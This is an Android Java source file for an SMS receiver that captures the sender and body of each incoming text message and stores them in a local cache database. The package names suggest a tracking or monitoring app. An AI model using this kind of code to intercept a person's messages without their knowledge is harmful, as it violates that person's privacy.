package org.gdocument.gchattoomuch.p2p.client.receiver;

import java.util.Calendar;

import org.gdocument.gchattoomuch.p2p.client.db.service.DbSmsCacheService;
import org.gdocument.gchattoomuch.p2p.client.model.Sms;
import org.gdocument.gtracergps.launcher.log.Logger;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {

	private static final String TAG = SmsReceiver.class.getSimpleName();

	@Override
	public void onReceive(Context context, Intent intent) {
		logMe("onReceive");

		// Retrieves a map of extended data from the intent.
		final Bundle bundle = intent.getExtras();

		try {

			if (bundle != null) {

				Object[] pdusObj = (Object[]) bundle.get("pdus");
				if (pdusObj!=null) {
					int size = pdusObj.length;
	        		logMe("nb pdusObj:" + size);
	
	        		String phoneNumber = "";
	        		String message = "";
					for (int i = 0; i < size; i++) {
	
						SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);

						phoneNumber = currentMessage.getDisplayOriginatingAddress();
						message += currentMessage.getDisplayMessageBody();
					} // end for loop
	
					process(context, intent, phoneNumber, message);
				}
				else {
	        		logMe("pdusObj is empty");
				}
			} // bundle is null
			else {
        		logMe("bundle is null");
			}

		} catch (Exception e) {
			Logger.logMe(TAG, e);

		}
	}

	private void process(final Context context, final Intent intent, final String phoneNumber, final String message) {
		new AsyncTask<Object, Void, Void>() {

			@Override
			protected Void doInBackground(Object... params) {
				boolean send = (intent != null && intent.getAction() != null && intent.getAction().compareTo("android.provider.Telephony.SMS_RECEIVED")==0);
				String type = send ? "2" : "1";
				String time = Long.toString(Calendar.getInstance().getTimeInMillis());

				DbSmsCacheService smsDataSource = new DbSmsCacheService(context, null);
				smsDataSource.create(new Sms(phoneNumber, message, "1", time, type));
//				smsDataSource.backup(type);
				return null;
			}
		}.execute();
	}

	private void logMe(String message) {
		Logger.logMe(TAG, message);
	}
}